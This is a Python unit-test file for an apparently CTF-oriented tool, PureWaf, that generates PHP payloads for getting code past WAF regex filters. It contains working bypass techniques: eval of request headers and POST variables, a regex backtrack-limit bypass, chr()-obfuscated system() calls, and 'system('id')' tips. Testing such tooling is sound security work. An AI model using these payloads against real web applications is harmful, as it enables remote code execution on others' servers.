import os
import shutil
import subprocess
import sys
import unittest
from unittest.mock import patch


ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

from PureWaf import bypass
from PureWaf import bypass_data
from PureWaf import PureWaf as core
from PureWaf.PureWaf import purewaf


REMOVED_PAYLOAD = "readfile(next(array_reverse(scandir(current(localeconv())))));"
BACKTRACK_REGEX = r"/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m"


class _FakeLogger:
    def __init__(self):
        self.messages = []

    def info(self, message):
        self.messages.append(str(message))

    def warning(self, message):
        self.messages.append(str(message))

    def error(self, message):
        self.messages.append(str(message))


class LinkPayloadValidationTests(unittest.TestCase):
    def test_payload_inventory_incremental(self):
        self.assertIn("eval(next(getallheaders()));", bypass_data.HEADER_EXEC_TEMPLATES)
        self.assertEqual(
            len(bypass_data.HEADER_EXEC_TEMPLATES),
            len(set(bypass_data.HEADER_EXEC_TEMPLATES)),
        )

        self.assertNotIn(REMOVED_PAYLOAD, bypass_data.FILE_ENUM_TEMPLATES)

        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=True,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.3,
        )
        payloads = bypass.generate_candidates(options)
        self.assertIn("eval(next(getallheaders()));", payloads)
        self.assertNotIn(REMOVED_PAYLOAD, payloads)

    def test_tip_emission_rules(self):
        self.assertTrue(core._looks_like_backtrack_risk_regex(BACKTRACK_REGEX))
        self.assertFalse(core._looks_like_backtrack_risk_regex("/flag|cat/i"))

        logger_header = _FakeLogger()
        core._emit_contextual_tips(
            logger_header,
            "eval(next(getallheaders()));",
            BACKTRACK_REGEX,
        )
        output_header = "\n".join(logger_header.messages)
        self.assertIn("TIPS: User-Agent: 1=system('id');", output_header)
        self.assertIn("TIPS: User-Agent: system('id');", output_header)
        self.assertIn("Example (Backtrack limit bypass):", output_header)

        logger_vh = _FakeLogger()
        core._emit_contextual_tips(
            logger_vh,
            "eval(array_pop(next(get_defined_vars())));",
            "/safe/",
        )
        output_vh = "\n".join(logger_vh.messages)
        self.assertIn("TIPS: POST: 1=system('id');", output_vh)
        self.assertNotIn("Example (Backtrack limit bypass):", output_vh)

    def test_runtime_validation_php_cli(self):
        php_bin = shutil.which("php")
        if not php_bin:
            self.skipTest("php CLI not found")

        def run_php(script):
            proc = subprocess.run(
                [php_bin],
                input=script.encode("utf-8"),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                check=False,
            )
            return proc.returncode, proc.stdout.decode("utf-8", "replace")

        script_backtrack = """<?php
$re='/^.*([\\w]|\\^|\\*|\\(|\\~|\\`|\\?|\\/| |\\||\\&|!|\\<|\\>|\\{|\\x09|\\x0a|\\[).*$/m';
$long=str_repeat('-',1200000);
$r=preg_match($re,$long);
var_dump($r,preg_last_error(),ini_get('pcre.backtrack_limit'));
"""
        code_backtrack, out_backtrack = run_php(script_backtrack)
        self.assertEqual(code_backtrack, 0)
        self.assertIn("bool(false)", out_backtrack)
        self.assertIn("int(2)", out_backtrack)
        self.assertIn('string(7) "1000000"', out_backtrack)

        script_header = """<?php
function getallheaders(){
    return ["Host"=>"a","User-Agent"=>"system('echo ua_ok');","Accept"=>"*/*"];
}
ob_start();
eval(next(getallheaders()));
$out = ob_get_clean();
echo $out;
"""
        code_header, out_header = run_php(script_header)
        self.assertEqual(code_header, 0)
        self.assertIn("ua_ok", out_header)

        script_vh = """<?php
$_POST["x"] = "system('echo vh_ok');";
ob_start();
eval(array_pop(next(get_defined_vars())));
$out = ob_get_clean();
echo $out;
"""
        code_vh, out_vh = run_php(script_vh)
        self.assertEqual(code_vh, 0)
        self.assertIn("vh_ok", out_vh)

        script_chr = """<?php
$_=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$__=chr(101).chr(99).chr(104).chr(111).chr(32).chr(99).chr(104).chr(114).chr(95).chr(111).chr(107);
ob_start();
$_($__);
$out = ob_get_clean();
echo $out;
"""
        code_chr, out_chr = run_php(script_chr)
        self.assertEqual(code_chr, 0)
        self.assertIn("chr_ok", out_chr)

    def test_ctf_style_end_to_end(self):
        fake_logger_a = _FakeLogger()
        with (
            patch("PureWaf.PureWaf._configure_logger", return_value=(fake_logger_a, False)),
            patch("PureWaf.PureWaf.time.sleep", return_value=None),
            patch("PureWaf.PureWaf.bypass.generate_candidates", return_value=["seed"]),
            patch("PureWaf.PureWaf.bypass.apply_encodings", side_effect=lambda payloads, _strategies: payloads),
            patch(
                "PureWaf.PureWaf.bypass.filter_payloads",
                side_effect=[["root-ok"], ["eval(next(getallheaders()));"]],
            ),
        ):
            result_a = purewaf(waf_regex=BACKTRACK_REGEX, log_level="INFO")

        output_a = "\n".join(fake_logger_a.messages)
        self.assertEqual(result_a, "eval(next(getallheaders()));")
        self.assertIn("TIPS: User-Agent: 1=system('id');", output_a)
        self.assertIn("Example (Backtrack limit bypass):", output_a)

        fake_logger_b = _FakeLogger()
        with (
            patch("PureWaf.PureWaf._configure_logger", return_value=(fake_logger_b, False)),
            patch("PureWaf.PureWaf.time.sleep", return_value=None),
            patch("PureWaf.PureWaf.bypass.generate_candidates", return_value=["seed"]),
            patch("PureWaf.PureWaf.bypass.apply_encodings", side_effect=lambda payloads, _strategies: payloads),
            patch(
                "PureWaf.PureWaf.bypass.filter_payloads",
                side_effect=[["root-ok"], ["eval(array_pop(next(get_defined_vars())));"]],
            ),
        ):
            result_b = purewaf(waf_regex="/safe/", log_level="INFO")

        output_b = "\n".join(fake_logger_b.messages)
        self.assertEqual(result_b, "eval(array_pop(next(get_defined_vars())));")
        self.assertIn("TIPS: POST: 1=system('id');", output_b)
        self.assertNotIn("Example (Backtrack limit bypass):", output_b)


if __name__ == "__main__":
    unittest.main()
